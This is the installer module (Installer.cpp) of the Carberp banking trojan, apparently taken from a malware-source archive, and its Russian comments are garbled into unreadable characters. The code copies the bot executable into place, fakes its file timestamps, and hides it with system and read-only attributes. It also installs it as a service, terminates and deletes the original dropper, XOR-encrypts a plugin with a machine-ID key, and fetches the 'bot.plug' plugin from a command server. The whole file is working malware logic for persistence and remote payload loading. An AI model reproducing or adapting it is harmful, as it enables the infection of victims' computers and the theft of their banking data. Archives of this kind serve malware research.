/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//****************************************************************************
//  Installer.cpp
//
//  ������ ���������� ������� ���������� ����
//
//  ������� 1.0
//  �������������: ������ 2012
//****************************************************************************

#include <ShlObj.h>
#include "Installer.h"
#include "StrConsts.h"
#include "BotUtils.h"
#include "BotCore.h"
#include "Crypt.h"
#include "Plugins.h"
#include "MD5.h"

//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace INSTALLERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define INSTDBG INSTALLERDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//----------------------------------------------------
//  Install - ������� ����������� ����
//
//  IsUpdate - ������� ����, ��� ��� ���������� ����
//             � �� ������ ����������
//
//  DeleteSourceFile - ������� �� �������� ����
//
//  SourceFileProcessPID - PID ��������, ������
//                         ���������� ��������� �����
//                         ��������� ��������� �����
//----------------------------------------------------
BOOL WINAPI Install(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID)
{
	if (!File::IsExists((PCHAR)FileName))
		return FALSE;

	string BotFile = BOT::GetBotFullExeName();

	// ��������� �� �������� �� �� ��������� ���������� ��
	// ������ ����
	if (StrSame((PCHAR)FileName, BotFile.t_str(), false, 0))
		return FALSE;

	INSTDBG("Installer", "����������� ���. Exe ���� %s", BotFile.t_str());

	// ������� ������ � ������� ����
	if (IsUpdate) BOT::Unprotect();
	BOT::DeleteBotFile(BotFile.t_str(), INFINITE, false);

	//  �������� ����
	BOOL Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE);
	INSTDBG("Installer", "�������� ���� ����. [Result=%d; Err=%d]", Result, pGetLastError());

	if (Result)
	{
		// ������������� ���� � �������� �����
		SetFakeFileDateTime(BotFile.t_str());
		pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
    }

	// ����������� ������
	if (IsUpdate)
	{
		// ��������� ������
		// � ������ ������� �������� ���������� ������ ������
		if (!BOT::UpdateService(FileName))
			BOT::InstallService(FileName);
	}
	else
		BOT::InstallService(FileName);


	// ������ ������ �� ��� ����
	if (IsUpdate) BOT::Protect(NULL);

	// ������� ���� ��������
	if (DeleteSourceFile)
	{
		DWORD Start = (DWORD)pGetTickCount();

		while ((DWORD)pGetTickCount() - Start < 5000)
		{
			if (SourceFileProcessPID)
				pWinStationTerminateProcess(NULL, SourceFileProcessPID, DBG_TERMINATE_PROCESS);

			pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE );
			BOOL Deleted = (BOOL)pDeleteFileA(FileName);
			if (Deleted || pGetLastError() != 5) break;
			pSleep(50);
        }
	}
	
	INSTDBG("Installer", "��������� ���� ���������. [Result=%d]", Result);

	return Result != FALSE;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  MakeUpdate - ������� ��������� ����
//----------------------------------------------------
bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
{
	// ��� ������������� ������ ����������� ���������
	if (ResetSettings)
		DeleteSettings();

	return Install(FileName, true, true, 0) == TRUE;
}






//**************************************************************
//        ������ ��� ������ � �������� ���� bot.plug
//**************************************************************


//----------------------------------------------
//  CryptBotPlug - ������� �������/���������
//                 ������� ����
//----------------------------------------------
BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
{
	if (!Buf || !BufSize) return FALSE;

	// �������� ������
	PCHAR Pass = MakeMachineID();
	if (!Pass) return FALSE;

    XORCrypt::Crypt(Pass, (LPBYTE)Buf, BufSize);

	return TRUE;
}


//----------------------------------------------
//  DownloadBotPlug - ������ ��������� ������
//  ����
//----------------------------------------------
/*
bool DoDownloadBotPlug(LPBYTE *Buf, DWORD *BufSize)
{
	// ���������� ������� bot.plug �������������� ���
	// ������� �������� ��������
	if (Buf)     *Buf = NULL;
	if (BufSize) *BufSize = 0;

	string PluginName = GetStr(EStrBotPlug);

	PCHAR URL = GetBotScriptURL(SCRIPT_PLUGIN);
	if (STRA::IsEmpty(URL)) return false;

	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword();
	#else
		THTTP HTTP;
	#endif
	HTTP.CheckOkCode = false;

	TBotStrings Fields;
	Fields.AddValue("name", PluginName.t_str());

	// ������� ����� �������
	bool Result = false;
	string Doc;
	if (HTTP.Post(URL, &Fields, Doc) && HTTP.Response.Code == 302)
	{
		// �������� ���� � �������� ������
		string PlugURL = HTTP.Response.Location;
		string MD5     = HTTP.Response.MD5;

		TBotMemoryStream Stream;
		HTTP.CheckOkCode = true;
		if (HTTP.Get(PlugURL.t_str(), &Stream))
		{
			if (!MD5.IsEmpty())
			{
				// ��������� ��5 ��� ������������ ���������
				string PlugMD5 = MD5StrFromBuf(Stream.Memory(), Stream.Size());
				Result = PlugMD5 == MD5;
			}
			else
				Result = true;

			if (Result)
			{
				// ��������  ������
				Plugin::SaveToCache(PluginName.t_str(), Stream.Memory(), Stream.Size());

				// ������� ����
				if (BufSize) *BufSize = Stream.Size();
				if (Buf)
				{
					*Buf = (LPBYTE)MemAlloc(Stream.Size());
					m_memcpy(*Buf, Stream.Memory(), Stream.Size());
				}
            }
		}

	}
	STR::Free(URL);
	return Result;
}


bool DownloadBotPlug(LPBYTE *Buf, DWORD *BufSize)
{
	bool Result = false;
	while (!Result)
	{
		Result = DoDownloadBotPlug(Buf, BufSize);
		if (!Result) pSleep(30000);
	}
	return Result;
}    */



//----------------------------------------------
//  LoadBotPlug - ������� ��������� ������
//
//  ���� ������ ���� �� �����, �� �� �����������
//  � �����. � ��������� ������ ������ �����-
//  ������ � ������� � ������������ �����������
//  �� �����
//----------------------------------------------
BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
{
	if (BufSize) *BufSize = 0;

	if (!Buf) return FALSE;

#ifdef DEBUGCONFIG
	// �������� �� ����� ������
/*	DWORD Sz = 0;
	*Buf = File::ReadToBufferA("c:\\bot.plug", Sz);
	if (BufSize) *BufSize = Sz;
	return *Buf != NULL; 
*/
#endif

	*Buf = Plugin::DownloadEx(GetStr(EStrBotPlug).t_str(), NULL, BufSize,
	                          true, true, NULL);


	return *Buf != NULL;
}




//----------------------------------------------
//  DeleteBotPlug
//  ������� ��������� ������
//----------------------------------------------
BOOL WINAPI DeleteBotPlug()
{
	return Plugin::DeleteFromCache(GetStr(EStrBotPlug).t_str());
}

//----------------------------------------------
//  UpdateBotPlug - ������� ��������� ������
//----------------------------------------------
BOOL WINAPI UpdateBotPlug()
{
	DeleteBotPlug();
	LPVOID Buf;
	LoadBotPlug(&Buf, NULL);
	BOOL Result = Buf != NULL;
	MemFree(Buf);
	return Result;
}



//----------------------------------------------
//  FreeBotPlug - ������� ����������� ������
//                ���������� ��� ������
//
//  ��������� ��� dll ����
//----------------------------------------------
VOID WINAPI FreeBotPlug(LPVOID Buf)
{
    MemFree(Buf);
}



